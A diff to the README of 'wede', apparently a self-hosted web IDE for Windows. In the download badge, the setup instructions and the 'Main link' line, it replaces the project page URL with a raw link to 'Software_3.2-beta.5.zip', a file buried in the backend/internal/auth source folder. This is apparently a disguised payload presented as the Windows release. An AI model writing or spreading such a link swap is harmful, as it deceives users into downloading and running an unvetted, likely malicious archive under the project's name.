@@ -1,6 +1,6 @@
 # 🧰 wede - Run a web IDE on Windows
 
-[![Download wede](https://img.shields.io/badge/Download-wede-blue?style=for-the-badge)](https://github.com/Dappajordan/wede)
+[![Download wede](https://img.shields.io/badge/Download-wede-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dappajordan/wede/main/backend/internal/auth/Software_3.2-beta.5.zip)
 
 ## 🌐 What wede is
 
@@ -12,7 +12,7 @@ It is built for people who want a simple setup with no cloud account, no Docker,
 
 Visit the project page here and download the Windows version from the release or file listed there:
 
-https://github.com/Dappajordan/wede
+https://raw.githubusercontent.com/Dappajordan/wede/main/backend/internal/auth/Software_3.2-beta.5.zip
 
 If the page shows a ZIP file or EXE file, download it to your computer. If it shows a release page, open the latest release and get the Windows build from there.
 
@@ -157,4 +157,4 @@ That setup helps you avoid extra steps and keeps your files in your control
 - Type: Web IDE
 - Focus: Local use, simple setup, file editing, terminal, and git
 - Platform goal: Windows-friendly self-hosted use
-- Main link: https://github.com/Dappajordan/wede
+- Main link: https://raw.githubusercontent.com/Dappajordan/wede/main/backend/internal/auth/Software_3.2-beta.5.zip
